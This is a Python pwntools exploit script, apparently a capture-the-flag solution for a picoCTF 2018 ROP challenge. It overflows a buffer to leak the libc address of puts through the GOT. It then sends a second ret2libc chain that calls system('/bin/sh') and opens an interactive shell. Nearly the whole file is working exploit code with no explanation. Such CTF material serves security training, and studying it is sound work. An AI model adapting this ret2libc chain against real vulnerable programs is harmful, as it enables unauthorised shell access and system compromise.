#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)
#Description: solution for picoCTF2018 rop challenge  (getting shell)

from pwn import *
import re

elf = ELF("/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9/rop")
libc = ELF("/lib32/libc.so.6")
#Stage 1: leak address 

payload = cyclic(28)
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])
p = process("/problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9/rop")
p.recvuntil('input>')
p.sendline(payload)
a = p.recvlines(timeout=2)[0]

a = a[1:]
b =  [a[i:i+4] for i in range(0, len(a), 4)]
puts = b[0]
libc_base = int(u32(puts)) - libc.symbols['puts']
system = libc_base + libc.symbols['system']
sh = libc_base + next(libc.search('/bin/sh\x00'))
log.success('libc base will be @' +hex(libc_base))
log.success("system addr will be @" + hex(system))
log.success("/bin/sh addr will be @" +  hex(sh))
#Stage 2: pop a shell :)
p.recvuntil('input>')
payload = cyclic(28)
payload += p32(system)
payload += p32(elf.plt['exit'])
payload += p32(sh)
p.sendline(payload)
p.interactive()
